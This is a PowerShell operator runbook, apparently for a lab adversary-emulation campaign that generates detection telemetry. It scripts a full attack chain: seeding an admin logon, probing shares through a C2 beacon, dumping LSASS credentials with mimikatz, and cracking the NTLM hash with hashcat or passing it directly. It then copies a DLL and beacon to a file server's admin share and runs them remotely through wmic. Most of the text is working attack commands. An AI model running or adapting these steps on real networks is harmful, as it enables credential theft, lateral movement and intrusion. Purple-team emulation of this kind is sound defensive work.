<#
C0015 phase-2 guided operator run — RUN ON WS01 (192.168.50.20), duc.user console.
Covers the operator-interactive steps: S0 seed -> S5 (remote note) -> S7 -> S7b -> S8a -> S8b.
(S4/S5 are driven remotely from the C2 host — see run_campaign_orchestrator.ps1.)

Passwords are ALWAYS entered at interactive prompts (net use * / runas) — never in
files, command lines or logs. Keep the S0 window OPEN until verification of S9.

Usage:
  pwsh -ExecutionPolicy Bypass -File payloads/packaging/run_ws01_operator.ps1 -RunId RUN-20260928-02 [-StagingDir C:\stage]
#>
[CmdletBinding()]
param(
    [string]$RunId = 'RUN-UNSET',
    [string]$StagingDir = 'C:\stage'   # folder on WS01 holding c0015_143_surrogate.dll + config-phase7.ini
)
$ErrorActionPreference = 'Stop'

function Step([string]$Title) { Write-Host "`n===== $Title =====" -ForegroundColor Cyan }
function Pause { Read-Host '   ... Press Enter to continue (Ctrl+C to stop)' | Out-Null }

Step 'S0 - IT logon seed (keeps it.admin ALIVE in WS01 lsass)'
Write-Host 'A runas window will open. ENTER the it.admin password at the prompt.'
Write-Host 'KEEP THAT WINDOW OPEN UNTIL S7b/S9 IS DONE (Ctrl+C at cleanup).'
Start-Process -FilePath runas.exe -ArgumentList '/user:C0015\it.admin', '"cmd /c ping -t 127.0.0.1"' -WindowStyle Normal | Out-Null
Pause

Step 'S5 - share probe (REMOTE via beacon, driven from C2 host)'
Write-Host 'S5 is not typed manually on WS01 - it runs through the beacon (controlled from the C2 host):'
Write-Host '  pwsh -File stage/ws01/c2-console-phase2.ps1 -Action Runbook -RunId <run>   (runbook already includes net view \FS01 + Get-SmbShare)'
Write-Host '  or -Action Cmd -Body "net view \\FS01"'
Write-Host '  or -Action Cmd -Body "powershell -NoProfile -Command `"Get-SmbShare | Out-File C:\ProgramData\found_shares.txt`""'
Write-Host 'Verify (Elastic WS01): E1 parent = beacon powershell + E11 found_shares.txt (DIRECT link).'
Pause

Step 'S7 - credential trial A/B/C (net use IPC$)'
Write-Host 'A) net use \FS01\IPC$ /user:C0015\duc.user *   -> expected error 5 (S4625)'
net use '\\FS01\IPC$' /user:C0015\duc.user *
net use \\FS01\IPC$ /delete *> $null
Write-Host 'B) net use \FS01\IPC$ /user:C0015\it.admin *   -> expected OK (S4648 + FS01 4624/4672)'
net use '\\FS01\IPC$' /user:C0015\it.admin *
Write-Host 'Keep connection B - do NOT /delete (keeps the it.admin session alive).'
Pause
Write-Host 'C) (optional) net use \FS01\IPC$ /user:C0015\<revoked> * -> denied; then /delete.'

Step 'S7b - REAL LSASS dump -> obtain -> crack (WS01 + Kali)'
if (-not (Test-Path C:\Tools\mimikatz.exe)) {
    New-Item -Force -ItemType Directory C:\Tools | Out-Null
    foreach ($src in @("$StagingDir\mimikatz.exe", 'C:\Users\duc.user\Desktop\mimikatz.exe', 'C:\Users\Public\C0015\mimikatz.exe')) {
        if (Test-Path $src) { Copy-Item $src C:\Tools\mimikatz.exe -Force; break }
    }
    if (-not (Test-Path C:\Tools\mimikatz.exe)) {
        Write-Warning "mimikatz.exe not found - place it at C:\Tools\mimikatz.exe and re-run this step."
    }
}
Write-Host '1) runas /user:C0015\it.admin "C:\Tools\mimikatz.exe sekurlsa::logonpasswords"'
Write-Host '   (the it.admin password is entered at the prompt to RUN the tool - an IT-run step, not a credential pivot)'
Start-Process -FilePath runas.exe -ArgumentList '/user:C0015\it.admin', 'C:\Tools\mimikatz.exe sekurlsa::logonpasswords' -WindowStyle Normal | Out-Null
Pause
Write-Host '2) In the output: copy the it.admin LINE -> obtain the NTLM hash (no plaintext on modern Windows).'
Write-Host '3) Crack on KALI: echo -n ''<NTLM>'' > /tmp/it.ntlm ; hashcat -m 1000 /tmp/it.ntlm rockyou.txt --show (or john --format=nt); rm -f /tmp/it.ntlm'
Write-Host '4) KEEP the plaintext in memory - S8 (wmic) will use this CRACKED plaintext at the runas prompt.'
Write-Host '   (Alternative: sekurlsa::pth /user:it.admin /domain:c0015.lab /ntlm:<hash> "cmd /c wmic ..." - different telemetry, no S4648)'
Pause

Step 'S8a - tool handoff (T1570): WS01 -> \\FS01\C$\C0015'
$dest = '\\FS01\C$\C0015'
try {
    New-Item -Force -ItemType Directory $dest | Out-Null
    Copy-Item "$StagingDir\c0015_143_surrogate.dll" "$dest\c0015_143_surrogate.dll" -Force
    Copy-Item "$StagingDir\config-phase7.ini"        "$dest\config-phase7.ini"        -Force
    Copy-Item C:\Users\Public\C0015\c0015_beacon.ps1 "$dest\c0015_beacon.ps1"         -Force
    Write-Host 'Copied 143.dll + beacon + config-phase7 to FS01.'
} catch {
    Write-Warning "C$ copy refused (admin rights required): $($_.Exception.Message)"
    Write-Host 'Re-run this step in an it.admin console, or copy manually:'
    Write-Host "  copy $StagingDir\c0015_143_surrogate.dll \\FS01\C$\C0015\"
}
Pause

Step 'S8b - WMI remote process (explicit it.admin)'
Write-Host 'RUN THE FOLLOWING COMMAND MANUALLY (password at the runas prompt):'
Write-Host 'runas /user:C0015\it.admin "cmd /c wmic /node:FS01 process call create \"rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry\""'
Write-Host '(If wmic is unavailable: Invoke-CimMethod -Credential (Get-Credential C0015\it.admin) - record PARTIAL - see the checklist.)'
Pause

Write-Host "`nWS01 steps complete (run_id=$RunId). Next: C2 host - S9 verify (ART-07-01 + callback) + artifacts + cleanup."
Write-Host 'REMINDER: only Ctrl+C the S0 window after S9 verification is done.'